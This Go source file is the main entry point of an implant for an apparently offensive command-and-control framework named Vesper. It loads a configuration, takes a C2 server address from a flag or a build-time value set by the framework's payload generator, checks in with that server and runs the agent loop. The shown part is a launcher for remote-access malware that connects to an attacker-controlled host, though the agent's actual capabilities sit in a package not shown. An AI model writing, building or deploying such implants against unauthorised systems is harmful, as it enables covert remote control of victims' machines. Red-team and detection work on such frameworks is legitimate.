package main

import (
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strconv"
	"syscall"

	"github.com/ruby570bocadito/vesper/internal/agent"
	"github.com/ruby570bocadito/vesper/pkg/shared/config"
)

// C2Addr can be baked in at build time with
// -ldflags "-X main.C2Addr=host:port" (vesper payload generate --c2 does
// exactly that). The runtime --server flag takes precedence over it.
var C2Addr = ""

func main() {
	configPath := flag.String("config", "config.yaml", "path to configuration file")
	serverAddr := flag.String("server", "", "C2 server address host[:port] (overrides config and build-time C2Addr)")
	flag.Parse()

	cfg, err := config.Load(*configPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to load config: %v\n", err)
		os.Exit(1)
	}

	switch {
	case *serverAddr != "":
		applyC2Addr(cfg, *serverAddr)
	case C2Addr != "":
		applyC2Addr(cfg, C2Addr)
	}

	agt, err := agent.New(cfg)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to create agent: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[+] Vesper Agent %s (os=%s arch=%s)\n", agt.ID(), os.Getenv("GOOS"), os.Getenv("GOARCH"))
	fmt.Printf("[+] Public key: %s\n", agt.PublicKey())

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigCh
		fmt.Println("\n[!] Shutting down agent...")
		agt.Stop()
		cancel()
	}()

	server := fmt.Sprintf("%s:%d", cfg.Agent.C2Server, cfg.Agent.C2Port)
	if err := agt.CheckIn(ctx, server); err != nil {
		fmt.Fprintf(os.Stderr, "check-in failed: %v\n", err)
		os.Exit(1)
	}

	if err := agt.Run(ctx); err != nil && err != context.Canceled {
		fmt.Fprintf(os.Stderr, "agent error: %v\n", err)
		os.Exit(1)
	}
}

// applyC2Addr splits a "host" or "host:port" address into the config
// fields the connector uses (C2Server + C2Port).
func applyC2Addr(cfg *config.Config, addr string) {
	if h, p, err := net.SplitHostPort(addr); err == nil {
		cfg.Agent.C2Server = h
		if port, err := strconv.Atoi(p); err == nil && port > 0 {
			cfg.Agent.C2Port = port
		}
		return
	}
	cfg.Agent.C2Server = addr
}
